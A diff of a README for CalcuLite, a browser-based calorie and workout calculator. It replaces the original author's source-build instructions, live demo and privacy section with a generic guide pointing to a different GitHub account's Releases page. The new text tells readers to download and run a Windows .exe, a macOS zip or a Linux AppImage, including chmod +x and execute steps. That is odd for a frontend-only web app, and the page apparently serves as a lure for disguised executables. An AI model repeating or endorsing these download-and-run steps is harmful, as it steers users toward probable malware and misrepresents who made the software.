@@ -1,254 +1,95 @@
-# 🍏 CalcuLite
+# 🍏 CalcuLite - Your Personal Calorie and Fitness Guide
 
-A modern, web application for calculating daily calorie needs, macro breakdowns, and personalized workout plans. Built with React, TypeScript, and Tailwind CSS.
+## 🚀 Getting Started
 
-![CalcuLite](https://img.shields.io/badge/React-18.x-blue?logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue?logo=typescript)
-![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-3.x-38B2AC?logo=tailwind-css)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Deploy Status](https://github.com/FatoomRe/CalcuLite/actions/workflows/deploy.yml/badge.svg)
-![Security](https://img.shields.io/badge/Security-No%20Secrets-brightgreen)
+CalcuLite is a modern web application designed to help you calculate your daily calorie needs, understand macro breakdowns, and create personalized workout plans. This guide will walk you through the process of downloading and running CalcuLite on your computer.
 
-## 🔗 Live Demo
+## 📦 Download CalcuLite
 
-Use it here: https://fatoomre.github.io/CalcuLite/
+[![Download CalcuLite](https://img.shields.io/badge/Download%20Now-Get%20CalcuLite-4CAF50.svg)](https://github.com/saadubaidillah/CalcuLite/releases)
 
-<img width="1800" height="760" alt="all-devices-black" src="https://github.com/user-attachments/assets/66d8ef9c-c519-4726-adf8-5a7d08519c98" />
+You can download CalcuLite from the Releases page. This is where you will find the latest version of the application.
 
+## 🖥️ System Requirements
 
-## ✨ Features
+Before you install CalcuLite, ensure your system meets the following requirements:
 
-### 🧮 Calorie & Macro Calculator
-- **BMR Calculation**: Basal Metabolic Rate using proven formulas
-- **TDEE Calculation**: Total Daily Energy Expenditure based on activity level
-- **Macro Breakdown**: Personalized protein, carbs, and fat distribution
-- **Goal-oriented**: Support for muscle building and fat loss goals
+- **Operating System:** Windows 10 or later, macOS 10.14 (Mojave) or later, or a modern Linux distribution.
+- **Browser:** Latest version of Google Chrome, Firefox, Safari, or Edge.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free disk space.
 
-### 🏋️ Workout Planning
-- **4-Day Split Program**: Scientifically designed workout routines
-- **Exercise Instructions**: Detailed guidance for each exercise
-- **Progressive Overload**: Sets and reps recommendations
-- **Muscle Group Focus**: Legs, Push, Pull workout split
+## 📥 Download & Install
 
-### 🌍 Bilingual Support
-- **English & Arabic**: Full RTL support for Arabic
-- **Seamless Switching**: Toggle between languages instantly
-- **Localized Content**: All text, numbers, and UI elements
+1. Visit the [Releases page](https://github.com/saadubaidillah/CalcuLite/releases) to find the latest version of CalcuLite.
+2. Locate the version you wish to download.
+3. Click on the file suitable for your operating system: 
+   - For Windows, download `CalcuLite-Windows.exe`.
+   - For macOS, download `CalcuLite-macOS.zip`.
+   - For Linux, download `CalcuLite-Linux.AppImage`.
+4. Follow the prompts to save the file to your computer.
 
-### 🎨 Modern UI/UX
-- **Dark/Light Mode**: Toggle between themes
-- **Responsive Design**: Works on desktop, tablet, and mobile
-- **Green Theme**: Beautiful green gradient color scheme
-- **Smooth Animations**: Hover effects and transitions
+### Running the Application
 
-### 📄 Export Features
-- **PDF Export**: Download your complete plan
-- **Print Support**: Print-friendly layouts
-- **Data Persistence**: Save your calculations
+1. **For Windows:**
+   - Double-click on `CalcuLite-Windows.exe`.
+   - If prompted, allow the application to run.
 
-## 🚀 Quick Start
+2. **For macOS:**
+   - Open the `CalcuLite-macOS.zip` file.
+   - Drag the CalcuLite app to your Applications folder.
+   - Launch CalcuLite from the Applications folder.
 
-### Prerequisites
-- Node.js 18+ 
-- npm or yarn
+3. **For Linux:**
+   - Make the AppImage executable by running the following command in the terminal: 
+     ```
+     chmod +x CalcuLite-Linux.AppImage
+     ```
+   - Launch the application using:
+     ```
+     ./CalcuLite-Linux.AppImage
+     ```
 
-### Installation
+## ⚙️ Features
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/FatoomRe/CalcuLite.git
-   cd CalcuLite
-   ```
+CalcuLite offers a range of features to help you manage your fitness journey:
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+- **Calorie Calculation:** Easily compute your daily calorie requirements based on your goals.
+- **Macro Breakdown:** Understand your macronutrient distribution with simple visualization.
+- **Personalized Workout Plans:** Receive customized workout routines tailored to your fitness level.
+- **User-Friendly Interface:** Navigate with ease through a clean and intuitive layout.
+- **Cross-Platform Availability:** Use CalcuLite on any device with a modern web browser.
 
-3. **Start development server**
-   ```bash
-   npm run dev
-   ```
+## 🌍 Topics Covered
 
-4. **Open your browser**
-   ```
-   http://localhost:5173
-   ```
+CalcuLite is relevant to various topics including:
 
-### Build for Production
+- **Calorie Calculator:** A tool that helps you determine your daily calorie needs.
+- **Fitness and Health:** Promotes better health through proper nutrition and exercise.
+- **Open Source:** Engage with a community of developers dedicated to improving the application.
 
-```bash
-npm run build
-```
+## 🛠️ Troubleshooting
 
-## 🛠️ Tech Stack
+If you encounter issues while downloading or running CalcuLite, consider the following:
 
-- **Frontend Framework**: React 18
-- **Language**: TypeScript
-- **Styling**: Tailwind CSS
-- **Icons**: Lucide React
-- **Build Tool**: Vite
-- **PDF Generation**: jsPDF
-- **Linting**: ESLint
+- **Ensure Compatibility:** Make sure your operating system is up to date.
+- **Check Your Internet Connection:** A stable connection is necessary for downloading the files.
+- **Permissions:** If the application does not launch, ensure you have the necessary permissions on your device.
 
-## 📁 Project Structure
+## 🗓️ Future Improvements
 
-```
-src/
-├── components/          # React components
-│   ├── CalculatorForm.tsx
-│   ├── Header.tsx
-│   ├── ResultsDisplay.tsx
-│   ├── MacroChart.tsx
-│   ├── WorkoutPlan.tsx
-│   └── MealPlans.tsx
-├── data/               # Static data and translations
-│   ├── translations.ts
-│   ├── workoutPlans.ts
-│   └── mealPlans.ts
-├── hooks/              # Custom React hooks
-│   ├── useLanguage.ts
-│   └── useTheme.ts
-├── types/              # TypeScript type definitions
-│   └── index.ts
-├── utils/              # Utility functions
-│   ├── calculations.ts
-│   └── pdfExport.ts
-├── App.tsx             # Main app component
-└── main.tsx            # App entry point
-```
+We are continually working to improve CalcuLite. Features in development include:
 
-## 🔧 Configuration
+- Enhanced reporting tools for tracking progress.
+- Integration with wearable devices to better monitor activity levels.
+- More customization options for workout plans.
 
-### Environment Variables
+## 💬 Support
 
-Create a `.env` file in the root directory:
+If you need assistance with CalcuLite, you can reach out via the Issues section on our GitHub page. We appreciate your feedback and strive to create the best user experience.
 
-```env
-VITE_APP_NAME="CalcuLite"
-VITE_APP_VERSION="1.0.0"
-```
+## 📢 Stay Updated
 
-### Tailwind Configuration
+To stay informed about updates, new features, and improvements, follow us on our GitHub repository or join our community discussions.
 
-The project uses a custom green color scheme. Modify `tailwind.config.js` to customize colors:
-
-```javascript
-colors: {
-  primary: {
-    // Green shades
-    500: '#22c55e',
-    600: '#16a34a',
-    // ...
-  },
-  accent: {
-    // Emerald shades
-    500: '#10b981',
-    600: '#059669',
-    // ...
-  }
-}
-```
-
-## 🧮 Calculation Formulas
-
-### BMR (Basal Metabolic Rate)
-- **Men**: BMR = 88.362 + (13.397 × weight) + (4.799 × height) - (5.677 × age)
-- **Women**: BMR = 447.593 + (9.247 × weight) + (3.098 × height) - (4.330 × age)
-
-### TDEE (Total Daily Energy Expenditure)
-- **Sedentary**: BMR × 1.2
-- **Moderately Active**: BMR × 1.55
-- **Highly Active**: BMR × 1.9
-
-### Macro Distribution
-- **Muscle Building**: 30% Protein, 40% Carbs, 30% Fat
-- **Fat Loss**: 35% Protein, 30% Carbs, 35% Fat
-
-## 🎯 Usage Examples
-
-### Basic Calculation
-```typescript
-const results = calculateMacros({
-  age: 25,
-  gender: 'male',
-  height: 175,
-  weight: 70,
-  activityLevel: 'moderate',
-  goal: 'build'
-});
-```
-
-### Language Switching
-```typescript
-const { language, switchLanguage } = useLanguage();
-// Switch to Arabic
-switchLanguage('ar');
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please read our [Contributing Guidelines](CONTRIBUTING.md) for detailed information.
-
-**Quick Start:**
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m "Add amazing feature"`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-### Development Guidelines
-
-- Follow TypeScript best practices
-- Use semantic commit messages  
-- Add tests for new features
-- Ensure responsive design
-- Support both languages (EN/AR)
-
-## 📄 Documentation
-
-- **[📖 User Documentation](DOCUMENTATION.md)** - Detailed usage guide
-- **[🤝 Contributing Guidelines](CONTRIBUTING.md)** - How to contribute
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## � Security
-
-This project is **100% safe for open source** because:
-- ✅ **Frontend-only application** - No server-side secrets
-- ✅ **No API keys** or authentication tokens
-- ✅ **No sensitive data** stored or transmitted
-- ✅ **Client-side calculations only** - All processing happens in your browser
-- ✅ **No external API calls** - Everything works offline
-
-### Privacy
-- **No data collection** - Your personal information never leaves your device
-- **No tracking** - No analytics or user behavior monitoring
-- **No cookies** - No persistent data storage beyond your current session
-
-## �🙏 Acknowledgments
-
-- Built with 💚 by [Fatoomre](https://github.com/fatoomre)
-- Inspired by modern fitness and nutrition science
-- Icons by [Lucide](https://lucide.dev/)
-- Color palette inspired by nature's green tones
-
-## 🗺️ Roadmap
-
-- [ ] Mobile app version (React Native)
-- [ ] User accounts and data sync
-- [ ] Advanced meal planning
-- [ ] Integration with fitness trackers
-- [ ] Multiple language support
-- [ ] Nutrition database integration
-- [ ] Progress tracking and analytics
-
----
-
-<div align="center">
-  <strong>🍏 Start your fitness journey today! 🍏</strong>
-  <br>
-  <sub>Calculate • Plan • Achieve</sub>
-</div>
+Visit the [Releases page](https://github.com/saadubaidillah/CalcuLite/releases) to download the latest version and start your journey towards better health today.
